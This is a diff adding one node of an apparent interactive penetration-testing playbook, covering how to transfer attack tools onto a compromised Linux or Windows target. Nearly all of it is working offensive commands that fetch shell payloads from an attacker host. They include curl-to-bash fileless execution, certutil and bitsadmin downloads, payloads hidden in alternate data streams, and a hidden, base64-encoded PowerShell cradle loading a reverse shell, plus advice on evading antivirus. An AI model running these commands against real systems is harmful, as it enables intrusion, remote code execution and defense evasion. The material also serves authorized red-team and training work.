@@ -1,0 +1,26 @@
+{
+  "id": "file_transfer",
+  "phase": "SHELL",
+  "title": "File Transfer — Get Tools on Target",
+  "body": "Getting tools onto a target is a skill. Know at least 3 methods per OS — one will always be blocked. Start your HTTP server first, then choose delivery method based on what's available.",
+  "cmd": "# -- ATTACKER: START FILE SERVER ----------\npython3 -m http.server 80\npython3 -m http.server 443   # if 80 blocked\n# Or SMB share (Windows targets love this):\nimpacket-smbserver share . -smb2support\nimpacket-smbserver share /path/to/tools -smb2support -username user -password pass\n\n# -- LINUX: DOWNLOAD TO TARGET -------------\n# wget — most common on Linux targets\nwget http://$lhost/linpeas.sh -O /tmp/lp.sh          # rename output\nwget -q http://$lhost/shell.elf -O /tmp/s             # quiet, short name\nwget --no-check-certificate https://$lhost/shell.elf -O /tmp/s  # ignore SSL\nwget -c http://$lhost/bigfile.tar.gz -O /tmp/f.tgz   # resume interrupted\nwget -b http://$lhost/linpeas.sh -O /tmp/lp.sh        # background download\nwget --user=user --password=pass http://$lhost/file   # authenticated\n# POST request via wget\nwget --post-data=\"cmd=id\" http://$ip/exec.php -O -\n\n# curl — fallback if wget missing\ncurl http://$lhost/linpeas.sh -o /tmp/lp.sh\ncurl -k https://$lhost/shell.elf -o /tmp/s            # ignore SSL\ncurl http://$lhost/shell.elf | bash                   # fileless — never touches disk\n\n# nc transfer (no HTTP available)\n# Attacker: nc -nlvp 4444 < file.sh\n# Target:   nc $lhost 4444 > /tmp/file.sh\n\n# base64 transfer (no network tools)\n# Attacker: base64 -w0 linpeas.sh\n# Target:   echo \"BASE64\" | base64 -d > /tmp/lp.sh\n\n# SCP (if SSH available)\nscp linpeas.sh user@$ip:/tmp/lp.sh\n\n# -- WINDOWS: DOWNLOAD TO TARGET ----------\n# -- certutil (LOLBin — built-in, hard to block) --\n# T1105: Ingress Tool Transfer\n# Paths: C:WindowsSystem32certutil.exe\n#        C:WindowsSysWOW64certutil.exe\n\n# Standard download — saves to current folder\ncertutil.exe -urlcache -f http://$lhost/shell.exe shell.exe\n\n# -split avoids caching (cleaner, less artifacts)\ncertutil.exe -urlcache -split -f http://$lhost/shell.exe C:WindowsTempshell.exe\n\n# verifyctl — alternate download method, same result\ncertutil.exe -verifyctl -f http://$lhost/shell.exe shell.exe\n\n# Save to Alternate Data Stream (ADS) — hides from dir listing\n# T1564.004: NTFS File Attributes\ncertutil.exe -urlcache -f http://$lhost/shell.ps1 C:WindowsTemplegit.txt:hidden\n\n# -- certutil encode/decode (T1027.013 / T1140) ---\n# Encode a file to base64 — useful for exfil or transfer\ncertutil -encode C:WindowsTempshell.exe shell.b64\n\n# Decode base64 back to binary\ncertutil -decode shell.b64 C:WindowsTempshell.exe\n\n# Decode hex-encoded file\ncertutil -decodehex shell.hex C:WindowsTempshell.exe\n\n# Verify transfer integrity\ncertutil -hashfile C:WindowsTempshell.exe MD5\n\n# PowerShell DownloadFile\npowershell -c \"(New-Object Net.WebClient).DownloadFile('http://$lhost/shell.exe','C:WindowsTempshell.exe')\"\n\n# PowerShell DownloadString (fileless — runs in memory)\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\"\n\n# bitsadmin (older Windows)\nbitsadmin /transfer job http://$lhost/shell.exe C:WindowsTempshell.exe\n\n# SMB copy (no HTTP needed — use impacket-smbserver)\ncopy \\$lhostshareshell.exe C:WindowsTempshell.exe\n# Or in PowerShell:\nCopy-Item \\$lhostshareshell.exe C:WindowsTempshell.exe\n\n# curl (Windows 10+)\ncurl http://$lhost/shell.exe -o C:WindowsTempshell.exe\n\n# wget (Windows 10+ — PowerShell alias for Invoke-WebRequest)\nwget http://$lhost/shell.exe -OutFile C:WindowsTempshell.exe\n# or explicitly:\npowershell -c \"wget http://$lhost/shell.exe -OutFile C:WindowsTempshell.exe\"\n# ignore SSL:\npowershell -c \"wget https://$lhost/shell.exe -OutFile C:WindowsTempshell.exe -SkipCertificateCheck\"\n\n# -- WINDOWS: EXECUTE IN MEMORY ------------\n# PS DownloadString — never touches disk\npowershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')\"\n\n# Encoded download cradle\nCMD = \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\"\necho CMD | iconv -t UTF-16LE | base64 -w0\npowershell -nop -w hidden -enc [OUTPUT]\n\n# -- VERIFY TRANSFER -----------------------\n# Linux\nmd5sum /tmp/file.sh\n# Windows\ncertutil -hashfile C:WindowsTempshell.exe MD5",
+  "warn": "impacket-smbserver is the most reliable Windows transfer when HTTP is blocked. Modern Windows requires SMB2 — always add -smb2support. If Defender blocks the download, use the in-memory DownloadString cradle — it never writes to disk. certutil is heavily signatured — Sigma, Elastic, and Splunk all have rules on it. If AV is active, use PowerShell cradle or SMB instead. IOC: certutil useragent strings are 'Microsoft-CryptoAPI/10.0' and 'CertUtil URL Agent' — both are logged.",
+  "choices": [
+    {
+      "label": "Tools transferred — Linux privesc",
+      "next": "linpeas"
+    },
+    {
+      "label": "Tools transferred — Windows privesc",
+      "next": "winpeas"
+    },
+    {
+      "label": "Transfer blocked — troubleshoot shell",
+      "next": "shell_troubleshoot"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
